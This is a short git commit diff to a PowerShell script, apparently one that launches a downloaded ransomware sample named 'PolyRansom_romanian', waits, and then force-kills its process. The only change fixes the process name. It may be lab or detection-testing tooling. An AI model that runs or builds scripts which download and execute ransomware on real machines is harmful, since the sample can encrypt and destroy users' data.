bfeac92b2b66c22228b73ebd665e1fa8b2a4b714
webntdev <96979468+webntdev@users.noreply.github.com>
2024-04-06 13:12:44 +0300

    Update execute.ps1

--- files/execute.ps1
+++ files/execute.ps1
@@ -35,7 +35,7 @@ Start-Sleep -Seconds 10
 if (Test-Path $downloadPath) {
     Start-Process -FilePath $downloadPath -Wait
     Start-Sleep -Seconds 10
-    Stop-Process -Name "PolyRansom_romanian.exe" -Force
+    Stop-Process -Name "PolyRansom_romanian" -Force
 } else {
     
 }
